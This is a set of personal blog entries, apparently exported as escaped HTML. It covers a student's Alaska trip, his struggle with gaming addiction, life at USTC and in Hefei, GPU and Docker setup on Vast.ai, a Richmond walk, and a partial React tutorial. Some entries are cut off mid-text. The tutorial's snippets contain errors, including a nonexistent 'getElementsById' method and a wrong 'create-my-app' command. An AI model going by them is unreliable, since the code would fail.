/>\n<img\nsrc=\"https://lh7-us.googleusercontent.com/ZffwCrXFZagwjO-YtBmFL2cucZDUHcyI8tjus-VaI8o-VWweoVJhvPUbMpkP8i5wYJtMALUw3FJ2XFmOZy0fxdopT40uBg-ciD_YEua6ixoxqBqnmozBLeDpZJeoAmR_eU7s5nknius4hO6FOu4GTXA=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nMirror Lake<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/oS36mJ-PFLXsz8Nl5uaYxy98cOv_qQWJhE4ezwg-zaMmW0XoTo41yQDWEfKsTsbl_6opkgcdaxmMizo_GUSZd1EK7QrGGgy8FjN4vBZC8frQIUnR9l5gDmg-seRGBz8k7lpb-HsNv2yaRpmquuzcBXU=s800\"\nstyle=\"width:80.0%\" /><br />\n</p>\n<h2 id=\"520\">520</h2>\n<p>Today is 520, and it is already a week since I arrived in Alaska, how\ntime flies!</p>\n<p>I slept all morning. Then I went for a hike, but I didn't know where\nto hike. My stomach hurt yesterday so I didn't have lunch and breakfast,\nand I went hiking without like anyfood, but it felt fine anyways. I went\non the hotel shuttle bus to Denali visitor center, and there was 4 old\npeople on it with me. One of them said he is 80 years old, and another\nsaid his grandson is 19 years old, and how he had moved to Anchorage in\nlike 1970s, around the time my parents were born. Anyways, we chatted a\nbit, and they were from California and Anchorage. Then I thought about\nhow they would be like a young boy like me 50 years ago. Then I thought\nabout how precious time is, that I should be spending my time doing the\nthing that is truly worth it, then one flick of a second later I would\nbe old as hell, and not able to walk anymore or whatever, and my stay in\nthis world is short, so I think I should do the thing I want now that I\nam in my prime and not leave things to do when I am old. Then I went on\nMount Healy Trail. The trail is much easier than the trails in Seward,\nand the road is clear and not steep. There is 1700 ft elevation gain. I\nalmost run up the trails, and it got so hot that I was sweating, even in\nshort sleeves. There are no snow on the ground, and I thought how much\neasier it is. There are tens of people going up the trail, and we all\nwaved hi as we went past each other. Then the road became steeper, and\nthe view opened up, and I could see mountains, but there are snows only\non top. Denali melts faster than Seward, where above like 500 ft\neverything was covered with snow. The mud is wet everywhere, and I\nreckoned it is the melting snow, but I don't see any snow until to the\nvery top. The wind is very strong, and it got quite dangerous after the\nend of mount healy trail. I was also almost out of water so I turned\nback. I felt quite energetic at the top of the mountain, then run down\nthe mountain. There are two women who was also running, and they passed\nme as they were running even faster. Then I went back and got water and\nwent on Rock Creek Trail.</p>\n<p>However, Rock Creek Trail is not worth it, just like a walk in the\npark. I walked very quickly, and went to Denali Park headquarters. But\nthere are few people, so I turned back. The trail turned out not to be\nshort, like 4 miles round trip, and it took me quite a lot of time, like\n1.5 hours. I decide to go back to hotel since it became late, and my\nlegs are a little sore. I think if I had woken up earlier I could've\nhiked more. Then I thought that the mountains in Hefei are a piece of\ncake, and how well constructed the roads were. I could go up and down 3\ntimes easily now. I figured it would feel strange to sleep before\nnighttime back in California.</p>\n<p>Then I went on an ATV tour. The bus driver picked me up at Princess\nHotel, and all the way to an ATV station. The driver said he was from\nColorado, and went to all states except Hawaii, which he hopes to make\nit in his 50th birthday, and that it was his 2nd year in Alaska.\nAnyways, he is very humorous and interesting. I thought what a life that\nwould be. The bus driver also said that the place to drive ATV is not in\nDenali National Park, since it is illeagal, instead, it is like 10\nsquare mile range separated from the park. Then we got off the bus.</p>\n<p>The ATV tour guides first introduced and talked about the rules, that\nwe shouldn't stop or shoot photos or do those front flips, or we will be\nremoved. The tour guides were called Rico and Stefan, They talked about\nhow we need to follow the next car for a reasonable distance, so that we\ncan see headlights and not get too close. It was my first time driving\nanything, and I was like the only person without driver's license. I sat\ninside the ATV, and the tour guide said we were only supposed to press\nbreak and acceleration and the wheel. Then we started to go up the\nmountain, and I felt very nervous indeed. Anyways, everything went on\nsmoothly, and I was able to drive easily. The tour then slowed down and\ntold me to stick on the same side as him as we would be passing other\ntours on the other side, and I followed.</p>\n<p>The road was very bumpy, and the ATV seemed to go over anything, like\nrocks, pebbles, and muds with melted snow. I tried very hard to balance,\nbut since the roads were full of ups and downs, the ATV went tumbling\nall the time, but it was still pretty smooth. The wheels doesn't turn\nreally well, so sometimes when the tour in the front made a sharp turn I\nhad to go through some bushes to catch up. We went at a reasonable pace,\nfast enough but also very safe from any collisions.</p>\n<p>Then we came to a scenic view and we stopped, then Stefan talked a\nlittle about the mountains and lakes around. Stefan said it was like 10\nhour hike up Mount Healy, and that the small town under there had 800\npeople in winter and 5000 in summer, since winter is -50 degrees. I was\nimpressed how fast the ATV drive was, and in just minutes we drove up so\nhigh up. I would be so much more tired if I hike up here, though.</p>\n<p>Then we went to a shallow river with a big sandcastle, and we stopped\nfor like 15 minutes. Rico and Stefan joked that they had come at 2 am to\nbuild it together. Then they explained that it was formed by erosion,\nand there are sands sliding down as we were talking. The lake was called\ndry creek, and they also explained that the river can travel anywhere,\nand they were formed by erosion of rocks, and how on every different\ntours the river would seem different, and how a landslide just came a\nfew years ago and blocked the river, filling everything with dead trees.\nI asked if I could possibly climb the sand-rock thing, and they said it\nwas too dangerous. Then they also picked up a few pebbles, and explained\nhow there might be jewels or gold in those rocks, and showed us how to\nmake clay as ancient people, using a redish rock to carve on another. I\ntouched the water and it was icy cold. The tour guides said we could\ndrive over the river but the other tourists were very scared and thought\nit dangerous. In the middle evening sun everything looked so\nglamorous.</p>\n<p>Rico and Stefan they came from Miami, and they said Miami was perfect\nin winter. Rico said that there are a really good highway in San\nFrancisco to drive, and there was just ocean, mountain, and you. Then he\nsaid he had been to everything in the lower 48 states, so he ended up\nhere in Alaska, which is the only place he had not yet explored. I said\nI wanted to go to Miami, and I thought that I was already planning my\nnext trip to Miami, Palm Beach, Fort Lauderdale, and Key West. The two\nother visitors said they were impressed how I could drive like that\nwithout a license. The guides also talked about fishing, and how they\nwould catch 10 big fish in an hour and get enough fish for a whole year\ndown in the Otto Lake. Anyways I could feel myself much more adventurous\nand tough without my parents around, and I felt young and energetic. I\nsaid the hike in Seward is much harder than the hike in Mount Healy, and\nthe guide said my shoes aren't right for hiking, and they had those long\nboots for fisherman, which goes over mud while I was wearing Nike\nPegasus, which is like distance running shoes, but they seemed all right\nfor hiking without snow, though.</p>\n<p>By the end of the day I was driving like it is something I do every\nday in my life, and it felt so good coming down the dusty trail. The ATV\nwas sliding but it is very safe. The guides said those ATVs can go\nacross anything, like bushes, and they can go all the way to the top of\nthe mountain. I saw those big horses on the way back, and the two horse\nin the front was leading a carriage filled with people. The tour guide\nwaved and the horses and carriages moved to one side, allowing me to\ndrive past on the other side.</p>\n<p>The tour guides are so nice that I ended up giving all my 5 dollar\nchange to them. But then I thought that they were only nice because I\npaid so much, and strangers are usually casual. Anyways, I am using my\nparent's money, so I am spending a lot, so they are nice to me because\nthey want good reviews so they can get more money. I would feel much\nbetter if I earned all the money myself. Then I checked up the price of\nRV, and they were very expensive, like the Minnie Winnie I hitchhiked on\nactally cost like 250 dollars one night, which is more expensive than a\nhotel room, but they were for a group. Then I thought maybe next time I\nwould be traveling with wife or girlfriend or something, but I don't\nhave and girls may not be hiking with me for 10 hours everyday and they\nare always very hard to understand, so it would be much harder for me so\nI would probably be traveling solo anyways. I thought about driving\naround the Alaska, going to Homer, Seward, Alyeska, Talkeetna, Healy,\nPrudhoe Bay in my RV, and it sounds so cool and I could do so many hikes\nevery day and sleep and get up whenever I want. Anyways, I don't think I\ncan do that. Then I thought about staying a few more days, as I don't\nwant to leave, but this trip is luxurious enough, and few people could\nafford 9 days in Alaska anyways. I thought about living here after\ngetting appropriate degrees or something and it looked pretty good if I\nhad a stable income. From every perspective Alaska is much better than\nBerkeley, while Shanghai and Hefei and just too crowded, and although I\ndon't think that is too bad, I kind of lived there for almost 20 years\nand want to try something different for couple of years maybe.</p>\n<p>Anyways, I didn't realize that it was 930, and the 2.5 hours passed\nso fast. On the drive back the driver got on the left shoulder of the\nhighway, which is illegal in Alaska, hoping to spot a wild anyway, but\nmoose didn't came out. Then we spotted two Dall Sheep on the mountain.\nThen we got back to the hotel.</p>\n<p>Then I went on a gift shop and bought 2 t-shirts, and the staff was\nreally friendly, and then I got really hungry, probably becuase I hadn't\neaten lunch and had a small dinner, so I got like few snacks for me.\nDenali is merely a tourist attraction, but it is very beautiful\nindeed.</p>\n<h3 class=\"photosafas2\" id=\"phsdfsaf\">Photos</h3>\n<p><br />\nMount Healy Trail<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/iAP3UDHlkL5-xZ_acegfJIKYejrJu5zhGqevFWbEoNxOuaamhyZDO73-BvoGwE4whS6bbsZML80WPvVYHqYd5xPNBw2GhCi15Q0Ikc-C6uoeXUsBEKod3MnovHisbEZ2yZrlpC4PFvvSoKDRtQGQ7YE=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nRock Creek Trail<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/ceCUweubRB14dzQNq1XHcacIQA0H6UCUqRTfaBAx_8Dt82dF-dhxJmowqc3PZs91RONB9l-DuyyLgqjhC2FvWwMKZMdoX0TXMgkmtlPm9Mv6fsrIjDG-IRp1_nNo6reHquTjB3jXHABQx7eNWMHbO7U=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nATV<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/AASebsDB2QiXgtoEzyzxGGX-BxKs1x4z57pWSbqB0jjDb7w-vR2wq8NcXck7w3a6-XR5TZwBKNfd2uk_ooF3VeMoQEYH4TJhkATSUvG2cg9VncI7jNm89IrG8VJhv_OD5tj2X0R6GacaekeSHnMPgtc=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nDry Creek<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/HszviEs9k6Zg-idO51b2XcbJWk2gQ4wx_1bzn-x4rcbZUO8uXYkq_dL5ssc6j_vdD2zx50tiTnOOQuWjTV6QIrvxGEH-v5yUVAp5Qd78TLZ8beODqYFVPLHbqgXYPtPyR1Huy0GTWKbmRisK8UwhzEc=s800\"\nstyle=\"width:40.0%\" /><br />\n</p>\n",

I hate to admit it but I was, and I am still\nvery much addicted.</p>\n<h2 id=\"what-games-am-i-addicted-to\">What games am I addicted to?</h2>\n<p>I consider my preference for gaming strange. I do not like the\nmainstream games like Clash Royale or Honor of Kings which my classmates\nplay. Instead, here is a list of games I remember being addicted to\n(from time order)</p>\n<ul>\n<li><strong>plants vs zombies</strong> 2nd grade-4th grade</li>\n<li><strong>plants vs zombies 2</strong> 4th grade-7th grade, sophomore\nyear</li>\n<li><strong>plants vs zombies ol</strong> 3rd grade-8th grade</li>\n<li><strong>carrot fantasy</strong><br />\n3rd grade-7th grade</li>\n<li><strong>carrot fantasy 2 (and the variation in 4399)</strong> 3rd\ngrade-7th grade</li>\n<li><strong>generals.io</strong> 10th grade-freshman year</li>\n<li><strong>zombsroyale.io</strong> sophomore year-now</li>\n<li><strong>brawl stars, slither.io</strong> not too addicted</li>\n</ul>\n<h2 id=\"measures-i-have-taken-to-prevent-myself-from-gaming\">Measures I\nhave taken to prevent myself from gaming</h2>\n<p>I have taken multiple measures to prevent myself from gaming, with\nsome success and failure.</p>\n<ul>\n<li>Before 6th grade I didn't remember taking any measures myself.</li>\n<li>In 6th grade I was addicted to plants vs zombies ol, and in the\nsecond semester I told myself that every time I play I would write it on\na notebook. In the end I controlled it.</li>\n<li>In 7th grade first semester I was addicted to plants vs zombies 2\nand carrot fantasy, and I wanted to stop gaming. One day I played carrot\nfantasy 8 hours. Shortly after, I deleted carrot fantasy. Then I was\naddicted to plants vs zombies 2, after about a month, I deleted plants\nvs zombies 2. Then I downloaded plants vs zombies 2 and was very much\naddicted again, then I deleted plants vs zombies 2 a second time. Then I\nstarted playing plants vs zombies ol, and couldn't stop playing it.</li>\n<li>In 8th grade I told myself I must stop gaming. In November I decided\ngaming is not meaningful. It was painful and in the second semester I\nremembered trying so hard. I tried to shift my attention to long walks\nand outdoor activities. In the second semester I played roughly once or\ntwice a week, or once two weeks. In the summer I played less afer\nshifting my attention completely to outdoor activities.</li>\n<li>In 9th grade I made an honest effort to stop gaming altogether. I\nplayed only once in September 13rd the first semester. In the second\nsemester covid came. I liked going outdoors so much at that time that\neven during covid I was out walking 2 hours every day. I played less\nthan 5 times the second semester, only before exams when I felt too much\npressure.</li>\n<li>In 10th grade first semester, I wasn't too much into gaming anymore.\nHowever, later that semester I suffered great disappointment, since I\ntried really hard studying(the hardest I ever tried so far as I could\nremember), but still got a really low score. As a result, I began to\nfeel depression and became easily irritated. In the second semester, I\nbegan to play generals.io sometimes, like about twice a week.</li>\n<li>In Freshman year first semester, all people in my dorm was so\naddicted to gaming, to the point I felt sick and hated the dorm. I hated\nschool very much but couldn't do anything since I live far from my\nparents. I played generals.io sometimes, like less than 1 hour a day. In\nthe C Programming course I coded generals.io single player in C language\nmyself. I couldn't do anything to stop it, but it wasn't that serious at\nthat time. I distinctly remember in Janurary 1st 2022 I was playing\ngenerals.io as the clock turned. In the second semester, however, I grew\nmore frustrated and hated the dorm even more, to the point where I\nsuffered great emotional distress. I tried to control gaming by writing\non my notebook before using computer, that \"this time I use computer\nonly for *** purpose, not for gaming\". I checked my computer time usage\nevery week. In the end I played for some time but it was under\ncontrol.</li>\n<li>In Sophomore year I decided to end it for all. However, everything\njust got worse. I wrote an essay myself on why gaming is bad, listing\nall pros and cons. However, it all got worse when I began playing\nzombsroyale.io. It all started when I accidentally came across the game\none afternoon and couldn't stop playing for 2 hours straight. In the\nfirst semester there was massive covid lockdowns, and I felt bored and\ndepressed being locked down, and couldn't control myself from playing\nzombsroyale anymore. In the second semester I got on the exchange\nprogram to UC Berkeley. Then things got even worse. In the US, I was\nvery lonely and unmotivated, and I completely lost control of playing\nzombsroyale. I played for more than 600 hours this year. I did try to\nstop playing, without any success. In October I stopped gaming for a\nweek straight, motivated to do work when the school was locked down,\ndestroying my motivation. In April I faced a challenging project, and\nstarted procrastinating, playing zombsroyale nearly all day long. I\nended up cheating in that project. In May I decided to end gaming, and\nsucceeded for a week. However, in June I was caught for the previous\ncheating, and I got very sad and fully embarrassed of myself, pulling\nmyself back into emotional distress I suffered for long. In early August\nI felt completely out of motivation and dropped one of the summer\nclasses, playing zombsroyale all day long for a week. Then I decided to\nstop gaming once and for all, but in the test I got really low scores,\nmaking me disappointed once again and lost motivation. Then in late\nAugust I tried to stop gaming by disabling zombsroyale /etc/hosts,\nrewriting the /etc/hosts every few seconds in systemctl service, and\ndropping the ip address of zombsroyale in iptables. However, the stress\nI faced with the coming semester was too huge, and I couldn't handle\neverything. As a result, I flushed the iptable, and manually changed\n/etc/hosts file and went back to gaming again.</li>\n</ul>\n<h2 id=\"why-cant-i-stop-gaming\">Why can't I stop gaming?</h2>\n<p>I did manage to stop gaming a few periods in my life successfully.\nHowever, every time I was pulled back into gaming by emotional distress\ncaused by real life problems.</p>\n<ul>\n<li><p><strong>Escape Mechanism</strong> : Gaming provides an escape\nfrom reality. When faced with overwhelming stress, uncertainties, or\ndisappointments, the virtual world offers a realm where I feel in\ncontrol, accomplished, and momentarily free from real-life\nchallenges.</p></li>\n<li><p><strong>Dopamine Release</strong>: The design of many games taps\ninto our brain's reward system. Completing a level, defeating an\nopponent, or achieving a high score releases dopamine, a\nneurotransmitter associated with pleasure and satisfaction. This can\ncreate a cycle where I turn to games to experience that feeling of\naccomplishment and reward, especially when it's lacking in other areas\nof my life.</p></li>\n<li><p><strong>Social Connectivity</strong>: For many, online gaming is\nnot just about the game but the community it provides. Engaging with\nlike-minded players, especially when feeling isolated or lonely, can\noffer a sense of belonging and camaraderie.</p></li>\n<li><p><strong>Routine and Habit</strong>: Over time, gaming can become\na deeply ingrained habit. Whenever there's a free moment or a stressful\nsituation, my instinct might be to turn to games, as it has become a\ndefault coping mechanism.</p></li>\n<li><p><strong>Lack of Alternative Coping Strategies</strong>: If I\nhaven't developed other means to manage stress, boredom, or other\nemotions, I might naturally revert to gaming, as it's a familiar and\npreviously effective method.</p></li>\n</ul>\n<h2 id=\"i-can-stop-gaming-if-im-traveling\">I can stop gaming if I'm\ntraveling</h2>\n<p>Traveling diverts my attention, and in traveling I have succeeded in\nnot gaming. But when facing loads of work and studying, I would often go\nback to gaming all over again.</p>\n<h2 id=\"gaming-itself\">Gaming Itself</h2>\n<p>Although gaming has all the cons, reasons are needed on why gaming is\nbad.</p>\n<p>Some invalid reasons include</p>\n<ul>\n<li>The teacher forbids me from gaming Teachers are usually not very\nsmart people in tech. For example, (most) teachers don't know how to\ncode. (Most) Teachers don't know how to use linux. (Most) Teachers don't\nknow computer networking. (Most) Teachers don't know html. (Most)\nTeachers don't know computer security. Trusting the teacher who has\nlimited knowledge in tech and is arrogant is stupid.</li>\n<li>Parents forbid me from gaming Same as above</li>\n<li>Gaming shifts your attention from studying Everything shifts my\nattention, including studying foreign languages, planning and taking\nlong walks. Just because gaming shifts my attention doesn't mean I need\nto quit gaming</li>\n<li>People who game don't study well People in top universities with top\nscores sometimes game a lot.</li>\n</ul>\n<p>Some valid reasons include</p>\n<ul>\n<li><strong>I gain nothing from gaming</strong> After running I run\nfaster, after studying I know more, after learning language I learn more\nabout culture. However, after gaming I get nothing.</li>\n<li><strong>Time consuming</strong> Gaming is addictive, and I usually\nspend more time than intended.</li>\n<li><strong>Mental Health Impacts</strong> Becoming too immersed in a\ngame can lead to heightened emotions and loss of control, exacerbating\nfeelings of distress or agitation.</li>\n<li><strong>Social Isolation</strong> While gaming can offer a virtual\ncommunity, it might also mean less time spent with family or friends in\nthe real world, leading to feelings of isolation or neglecting important\nrelationships.</li>\n</ul>\n<p>However, I must also acknowledge painfully that pros of gaming\nexists</p>\n<ul>\n<li>Gaming is exciting and life is boring</li>\n<li>Gaming is escape when facing stress</li>\n<li>Gaming includes online conversation, which I might want when feeling\nlonely</li>\n<li>Gaming moves may seem cool and accomplishing</li>\n</ul>\n<h2 id=\"whats-next\">The essay I wrote before</h2>\n<p>https://www.jimchen.me/Thu%20Oct%2013%202022%2014:10:02</p>\n<h2 id=\"whats-nedfdxt\">What's next?</h2>\n<p>I gamed for more than 600 hours in the past year, that is the\nequivalent of losing one half month. I can do so much in one half month\n(without taking into account the fact that when I was gaming I was more\ntired than usual).</p>\n<p>I run out of motivation lately. I couldn't stop myself from gaming\nlately. Every time I tried to stop gaming, gaming dominated my life even\nmore.</p>\n<p>What should I do next?</p>\n<p>Updates<br />\nI stopped gaming at October 15th, and it's been one month without gaming\nat all. It has been very hard, and I faced mental challenges. I hope I\ncan stay away from gaming forever.</p>\n",

I don't know why I am thinking that.</p>\n<p>What I think is that, basically, I think I know what to do at USTC. I\nmean, I even think I am pretty well off there. I don't even think there\nwould be a problem if it wasn't for the covid restrictions and mass\ntesting. The only thing would be that I was kinda bored. But that\ndoesn't matter cause I had been feeling bored for half a decade. I think\nI got used to that kind of life and identity now.</p>\n<p>If I am back in USTC right now, I would be living in my house on the\n32nd floor and preparing for my exams.

I know exactly what to do at\nUSTC. I found my identity. I can follow the path down the road. I don't\nneed to think that much.

I consulted ChatGPT for a script and created one with yay. It\ncompiled successfully on my machine, except for when building yay -\ninstalling golang consistently resulted in a network error. To resolve\nthis, I switched to yay-bin, and everything functioned properly.</p>\n<p>However, deploying it on a GPU caused the Docker to malfunction with\nNvidia. Attempts to install software invariably led to errors, with\nmessages stating that Nvidia drivers were already installed and certain\nlibrary paths were not found. After trying various solutions, such as\nspecifying the path or reinstalling the libraries, I remained at a\nloss.</p>\n<h2 id=\"opting-for-a-custom-docker\">Opting for a Custom Docker</h2>\n<p>Ultimately, I selected a Docker precompiled with PyTorch and CUDA,\nwhich performed admirably. Given the wide variety of GPUs, significantly\nsurpassing those available on Colab and in regions outside mainland\nChina, my initial choice was an RTX 3090 in Japan. However, the slow\nconnection speed and limited disk space of only 16 GB (due to my\noversight in not specifying the disk space) proved problematic.\nSwitching to an A6000 with faster internet speeds yielded a much better\nexperience.</p>\n<h2 id=\"disdain-for-apt\">Disdain for apt</h2>\n<p>In comparison to yay, apt feels inferior. apt\u2019s packages are notably\noutdated; for instance, the node.js packages are limited to version 12,\nlacking support for many features.</p>\n<p>Despite Ubuntu\u2019s design for stability, my personal experience with\nArch has been devoid of instabilities.</p>\n<h2 id=\"ffmpeg-issue\">ffmpeg Issue</h2>\n<p>The version of ffmpeg installed via apt, frustratingly, did not\ninclude libass by default, eliminating subtitle options. I circumvented\nthis by downloading the source code and recompiling it with the\nnecessary flags.</p>\n<h2 id=\"dropbox-token-issue\">Dropbox Token Issue</h2>\n<p>Initially, when using the Python Dropbox SDK, it relied on a\nshort-lived token that quickly expired, preventing access to Dropbox\nafter 2 hours. To overcome this, I sourced a script from GitHub that\nmade use of the refresh token.</p>\n<p>Despite these challenges, Vast.ai remains the most cost-effective\noption for GPUs.</p>\n",

        "body": "<p>A spare day allows me to write a little about my everyday life in\nHefei.</p>\n<p>One thing I still remember is fruits. There's a fruit store on the\neast campus just beside the cafeteria, so every time I finished lunch,\nI'd go there and pick something. The foods in Hefei are salty, so it's\ngood to have something sweet and juicy. The fruits aren't expensive,\nthey usually cost me no more than 15 yuan. There were apples, bananas,\nwater lemon, kiwi fruit, oranges. The melon is sold in slices. So you\npick up a slice and walk over to the counter, and the man would cut it\nout for you. You needn't go home and cut the fruit peel the fruit\nyourself. You can just buy one slice at a time, which is about 3\nyuan.</p>\n<p>I quickly became fond of eating fruits. After I bought the fruit, you\nknow, the roads outside were pretty crowded, I would walk east down a\npath that leads to a quieter place. The east part of the east campus is\nmostly apartments, and it seemed pretty much like a park. There are few\npeople, and most of those people are old men and women. It is a pretty\npleasant place. There are lots of trees and lawns to walk on.</p>\n<p>Walk a little farther and there is the USTC kindergarten. You can see\nsome old man reading his newspaper while waiting for their grandson and\ngranddaughter at around noon. Under the shade of trees sometimes you can\nsee a fat cat. But if you walk too near, the cat will frantically run\naway to some other places he considered safer. Eating fruit under these\ntrees is enjoyable.</p>\n<p>Sometimes there are a group of old men and women who brought a large\nbag with them. They pick up trash as they walk around. They are the\nvolunteers who help make the campus clean.</p>\n<p>I also liked the nighttime snacking. It isn't anything like the\nnighttime snacks in my high school, believe me. Every night around 11 pm\nsome stalls will arrive on Feixi Road. The road there was lighted up and\nbustling with noise and excitement. Their smells can lure just about\nanybody. There are stinky tofu, kebabs, stewed pear, and cold noodles.\nThe foods are sour and spicy with strong flavors. But when you grow so\nfrustrated with math and physics and still had to prepare for the tests,\neating here is a good option to empty your mind.</p>\n<p>The library is on the west side of the cafeteria. It is usually\ncrowded with students, and hard to find a seat since students always\noccupy seats. Then a little north is a cafe called USTC 1958. The cafe\nis really expensive and popular among students and teachers. The cafe\nmainly sells cakes, and one little cake and costs 30 yuan, more than\naverage eating prices for a whole day. You can seat there as long as you\nwant without ordering anything. I usually rest there for a while.\nThere's also free water and sugar and a toilet inside.</p>\n<p>In warmer weather people chat outside. When winter arrives people\nusually sit inside to avoid the chill.</p>\n<p>I saw a lot of familiar people inside the cafe. Once I saw Mr.\u00a0Ye and\nhis wife having a cup of coffee there. Mr.\u00a0Ye is the teacher for\nElectromagnetism. He is a scholar of much knowledge and erudition.\nAnother time I saw the assistant teacher of my physics class there with\nhis girlfriend.</p>\n<p>Beside the cafe, there is the statue of Guo, the founder of USTC. He\nstood tall. There are many children playing beside the statue.</p>\n<p>Walk to the west and, right in the middle of the east campus is\nSchool of the Gifted Young. It is a small building of only 4 stories.\nThere is a tiny computer lab and library inside.</p>\n<p>Then to the north side of the east campus, there're two buildings.\nOne is for the math and economy department, another is for the\ndepartment of Earth and Space Sciences. They both have 16 stories. The\nEconomy Department is on the lower floors of the math building. You can\nfind the professors who taught your math classes on the top floors of\nthe math building. Mr.\u00a0Cheng and Mr.\u00a0Sheng are both on the fifteenth\nfloor of that building. You can hear the professor discussing their\nquestions from the corridor in that building.</p>\n<p>I really liked the earth &amp; space building. On the sixteenth floor\nof that building, there's a platform where you can see the roads\noutside. It was especially beautiful when the sun went down the west,\nand give all the cars and roads a reddish and goldish color. There is\nthe hospital and the Anhui restaurant. The city center of Hefei is\nreally crowded and dirty, tall buildings are everywhere.</p>\n<p>On the other side, the whole east campus is visible. The paths look\nlike blood vessels, filled with people, bikes, cars going here and\nthere.</p>\n<p>They are doing experiments on that opening platform, something about\nlasers, so the door soon became locked and I could no longer go on that\nplatform. On some nights you can see a green beam that shoots out of the\ntop of the earth &amp; space building and you know they are doing\nexperiments there.</p>\n<p>There are just so many things going on on campus. Some people say I\ndo not like to take part in activities. That is true, of course. I\nhadn't taken part in many activities throughout the semester. I had only\nattended the singing party at the end of December. But walking around\nthe campus is all the same. They are just two different ways of\nrelaxation, and I do not care too much about that.</p>\n",

        "body": "<p>So this Friday I went to visit Richmond. I went to North Berkeley\nBart Station, which is not far and downhill from my house, then took the\nBart to Richmond Station. There is Amtrack Train in Richmond station.\nWhen I got out of the station, the roads looked very rundown. There are\nhomeless people everywhere and the roads are very dirty. There is\nnothing good about the place, and I dreaded that place instantly.</p>\n<p>So I looked at map and went south to Marina Park, which is north of\nthe bay. It was a long walk, there were no people on the streets, and\nthe street was very dirty. But after walking pass a highway everything\nbegan to feel cleaner. Then I walked into athe Marina Park.</p>\n<p>There are many geese in the park, and many boats in the harbor. There\nare hundreds of geese, and their poops are everywhere on the road. I\nwonder how it feels to live in the toilet?</p>\n<p>Walking past the large group of geese I could see the bay area, and\nthe view is quite good, and the bayy trail was clean and not dirty like\nthe roads outside.</p>\n<p>I could see Albany from the trails, and the small hills with a few\nhouses. I could also see the golden gate bridge. The view was pretty\ngood in the sun.</p>\n<p><img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/5baf4990-3b06-4fd4-a97c-f911e3a40897\"\nstyle=\"max-width: 400px\" /> <img\nsrc=\"https://github.com/jimchen2/nonimportant/assets/123833550/5934271c-0228-4f6b-816c-e41bcb19f5db\"\nstyle=\"max-width: 400px\" /></p>\n<p>Then I continued walking for a while and went on a lyft home. I felt\nkind of dizzy later that day for no reason.</p>\n<p>This is a short post so I think that's it. In conclusion, Richmond is\na drity and ugly place, but the bay trails are definitely worth\nvisiting. I then realized that there are no parks around here, which is\nkind of sad, so the best place for hiking may be bay trails, which I\nwent multiple times this year.</p>\n",

As a minimalist, I am not a big fan of designing\nanyways.</p>\n<h2 id=\"jquery\">Jquery</h2>\n<p>Html and CSS for javascript is kind of like EasyX in C Language or\nTkinter in Python, which you can use to create better applications.</p>\n<p>Javascript makes the webpage alive. For example, you can change\nclasses with Javascript with</p>\n<pre><code>document.getElementsById(&quot;&lt;someid&gt;&quot;).innerHTML=&quot;&lt;somehtml&gt;&quot;</code></pre>\n<p>Or add a function after button clicking by specifying</p>\n<pre><code>&lt;button onclick=&quot;somefunction()&quot;/&gt;</code></pre>\n<p>Also you can add event listener(clicking or keyboard or hand\nmovement), alerts, set interval for functions, for example like <a\nhref=\"https://mygame4214.github.io/2048/2048.html\">this page</a></p>\n<p>You can also add forms and input, and dynamically change the input.\nAlso Javascript can modify cookies, and adjust site settings according\nto the cookies.</p>\n<h2 id=\"react\">React</h2>\n<p>React is Javascript Library.</p>\n<p>By using the components, and you can define a kind of component and\nuse it again and again, like customized Button</p>\n<p>Start React by typing</p>\n<pre><code>npx create-my-app &lt;appname&gt;</code></pre>\n<p>then naviagate to index.js and change it.</p>\n<p>By running npm start, you can see the website on localhost:3000</p>\n<p>Also, I didn't use the app.js file, and I deleted all the logos and\nnot useful stuffs.</p>\n<h3 id=\"routing\">Routing</h3>\n<p>First code the elements you want on a separate js file, and they\nshould return HTML files. For example, , then render it on a path.\n(Maybe you want to render about-me on \"/aboutme\")</p>\n<pre><code>      root.render(\n        &lt;HashRouter&gt;\n          &lt;NavBar /&gt;\n          &lt;Routes&gt;\n            &lt;Route path=&quot;&lt;somepath1&gt;&quot; element={&lt;someelement&gt; /&gt;} /&gt;\n            {path}\n          &lt;/Routes&gt;\n          &lt;Footer /&gt;\n        &lt;/HashRouter&gt;</code></pre>\n<p>Use BrowseRouter or HashRouter (not much difference between the two\nfor me except HashRouter has /#/ on the URL), to construct all path of\nthe website. For example, if there is 3 subpages on a website(aboutme,\ncontact, blog), then code like:</p>\n<pre><code>    &lt;Route path=&quot;/aboutme&quot; element={&lt;AboutMe /&gt;} /&gt;\n    &lt;Route path=&quot;/contact&quot; element={&lt;Contact /&gt;} /&gt;\n    &lt;Route path=&quot;/blog/&quot; element={&lt;Blog /&gt;} /&gt;</code></pre>\n<h3 id=\"dynamic-routing\">Dynamic Routing</h3>\n<p>You can also build pages (like a blog), where the page may change and\nbe added, build it like</p>\n<pre><code>// For Loop \narr[i] = (\n          &lt;Route\n            path={date[i]}\n            element={BlogUtil(title[i], text[i], date[i])}\n          /&gt;)</code></pre>\n<p>Then basically add the array with {} in the middle of routes</p>\n<h2 id=\"components-and-props\">Components and Props</h2>\n<p>Build a personal component by adding props in the function, for\nexample, building a button function</p>\n<pre><code>const Button = (props) =&gt; {\n  return (\n    &lt;div&gt;\n      &lt;p&gt;{props.title}&lt;/p&gt;\n      &lt;button&gt;{props.text}&lt;/button&gt;\n    &lt;/div&gt;\n  );\n};</code></pre>\n<p>then export then Button. This reduce many lines of duplicate code.\nYou can then add the personalized button with title and text</p>\n<pre><code>&lt;Button text=&quot;&quot; title=&quot;&quot; /&gt;</code></pre>\n<h2 id=\"ui\">UI</h2>\n<p>Of course coding everything is too much, and there are lots of UI\nlibraries, like React-Bootstrap. Install the library from npm, then you\ncan use the components by changing it a little bit.</p>\n<p>For example, a navbar in React-Bootstrap</p>\n<pre><code>    &lt;Navbar className=&quot;bg-body-tertiary&quot;&gt;\n      &lt;Container&gt;\n        &lt;Navbar.Brand href=&quot;#home&quot;&gt;React-Bootstrap&lt;/Navbar.Brand&gt;\n        &lt;Navbar.Toggle aria-controls=&quot;basic-navbar-nav&quot; 